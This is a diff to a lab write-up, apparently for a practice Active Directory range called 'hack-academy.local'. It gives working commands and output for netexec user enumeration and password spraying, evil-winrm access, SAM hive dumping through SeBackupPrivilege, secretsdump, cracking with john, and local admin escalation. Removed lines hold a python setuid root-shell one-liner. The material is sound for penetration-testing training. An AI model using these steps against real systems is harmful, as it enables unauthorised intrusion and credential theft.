@@ -321,45 +321,232 @@ nano /home/kali/.nxc/nxc.conf
 ```
 
 Now we upload the .zip file. to BH.
+
+Next, let's grab all the usernames from SMB.
+
+```sh
+netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
+
+<<EOF
+Administrator
+Guest
+krbtgt
+mjohnson
+lbennett
+egreen
+spatel
+dreyes
+nflores
+clee
+otran
+zmiller
+mross
+twest
+eknight
+mthompson
+EOF
+```
+
+If we just run `netexec ldap 10.0.2.4 -u lbennett -p '!!reiD123' --users`, we notice that we have a credential - `HappyCactus$10`.
+
+```sh
+rm pass || echo "no pass file"
+echo 'HappyCactus$10' >> pass
+echo '!!reiD123' >> pass
+```
+
 ## Non-root access
 
-I searched through exploit-db for CVE-2025-1234, and found a script:
+Now we can password spray on SMB and RDP. :)
 
-(IMG_PLACEHOLDER)
+```sh
+netexec smb ips -u users -p pass --continue-on-success
 
-I ran the script once, and it failed:
+<<EOF
+SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\lbennett:!!reiD123 
+SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\twest:HappyCactus$10 
+SMB         10.0.2.7        445    CLIENT-1         [+] hack-academy.local\lbennett:!!reiD123 
+SMB         10.0.2.7        445    CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 
+SMB         10.0.2.4        445    DC01             [+] hack-academy.local\lbennett:!!reiD123 
+SMB         10.0.2.4        445    DC01             [+] hack-academy.local\twest:HappyCactus$10 
 
-    python 50640.py -t 192.168.68.24 -p 8000 -L 192.168.49.68 -p 4444
+EOF
+```
 
-(IMG_PLACEHOLDER)
+RDP:
 
-So, I created a "Project" in Gerapy's web UI.
+```sh
+netexec rdp ips -u users -p pass --continue-on-success
 
-(IMG_PLACEHOLDER)
+<<WOOMY
+RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\lbennett:!!reiD123 
+RDP         10.0.2.9        3389   CLIENT-2         [+] hack-academy.local\twest:HappyCactus$10 
+RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\lbennett:!!reiD123 
+RDP         10.0.2.7        3389   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 
+WOOMY
+```
 
-I ran it again, and it succeeded.
+WinRM:
 
-(IMG_PLACEHOLDER)
-    
-    ip a
-    whoami
-    hostname
-    date
-    cat local.txt
+```sh
+netexec winrm ips -u users -p pass --continue-on-success
+
+<<OWO
+WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\twest:HappyCactus$10 (Pwn3d!)
+OWO
+```
+
+Good stuff, WinRM is an outlier.
+
+Now let's examine `lbennett` in BloodHound.
+
+We should mark `lbennett` and `twest` as owned in BH.
+
+If we search for Domain Admins in Cypher pre-existing queries, we notice that "MTHOMPSON" is a domain admin...hmmmmm...
+
+Another useful query is "Shortest paths from Owned objects".
+
+We can also check "AS-REP".
+
+It's also useful to check "Kerberoastable members of Tier Zero / High Value groups".
+
+Another one is "Principals with DCSync privileges".
+
+(We find nothing interesting from BH)
+
+Note that BloodHound data comes from a domain controller, so its accuracy is only scoped to that.
+
+So, we know we can WinRM onto CLIENT-1 (10.0.2.7) with `twest`...Let's do it!
+
+```sh
+evil-winrm -i 10.0.2.7 -u twest -p 'HappyCactus$10'
+```
+
+We're in.
+
+If we run `whoami /all`, we can see that we have `SeBackupPrivilege` and we're part of the "Remote Management Users" group. We will abuse this.
+
+If we were on a DC, we could dump password hashes, but sadly we're on a client.
+
+```powershell
+cd c:\
+mkdir temp
+cd temp
+reg save hklm\sam c:\temp\sam
+reg save hklm\system c:\temp\system
+
+# now we can use evil-winrm's download feature
+
+download sam
+download system
+```
+
+Now, on Kali, we can get those sweet sweet hashes.
+
+```sh
+impacket-secretsdump -system system -sam sam local
+
+<<UWU
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xbacf965a2426afda3d2207e4d6aa3904
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:156e3de3d13ba510e8c2b62f4f5d0216:::
+Matt:1002:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+
+UWU
+```
+
+Save the hashes to `hashes_local_Client-1_10.0.2.7.txt` with `gedit`. We only care about the `Matt` and `Administrator` hashes.
+
+Let's crack!
+
+```sh
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes_local_Client-1_10.0.2.7.txt 
+
+
+# Password1!       (Matt)     
+
+echo 'Password1!' >> pass
+```
+
+Note that Matt isn't a domain user, it's a local user.
+
+But perhaps his password can be useful.
+
+It's important to note that we need to use `--local-auth` or else this won't work. Because Matt isn't on the domain.
+
+```sh
+netexec smb ips -u Matt -p 'Password1!' --local-auth
+
+<<EOF
+
+success...
+
+SMB         10.0.2.7        445    CLIENT-1         [+] CLIENT-1\Matt:Password1! 
+
+EOF
+```
+
+Now to check RDP.
+
+```sh
+netexec rdp ips -u Matt -p 'Password1!' --local-auth
+
+<<RDPSTDOUT
+
+
+RDP         10.0.2.7        3389   CLIENT-1         [+] CLIENT-1\Matt:Password1! (Pwn3d!)
+
+RDPSTDOUT
+
+```
+
+Matt can RDP on CLIENT-1. Let's try it.
+
+```sh
+
+xfreerdp3 /v:10.0.2.7 /u:matt /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
+```
+
+Inside RDP, let's run:
+
+```sh
+whoami /all
+```
+
+Looks like we're an admin as Matt. Yay :)
+
+Let's pop an admin shell on CLIENT-1.
+
+```sh
+net localgroup "administrators" twest /add
+```
+
+Now, back in Kali, if we run:
+
+```sh
+netexec smb ips -u twest -p 'HappyCactus$10'
+```
+
+We should notice that `netexec` says "pwned". This is because we added ourselves to a local admin group.
+
+Because we have admin, now we can dump hashes remotely using `netexec`.
+
+```sh
+netexec smb ips -u twest -p 'HappyCactus$10' --sam
+```
+
+
+
 
 ## Root access
 
-For root access, I started by searching for binaries with this command that had the capability to run as root set:
-
-    getcap -r / 2>/dev/null    
-
-(IMG_PLACEHOLDER)
-
-I found that `/usr/bin/python3.10` had the capability to run as root set, meaning we can get a root shell by running this command:
-
-    /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-
-(IMG_PLACEHOLDER)
+tbd
 
 ## Proof
 
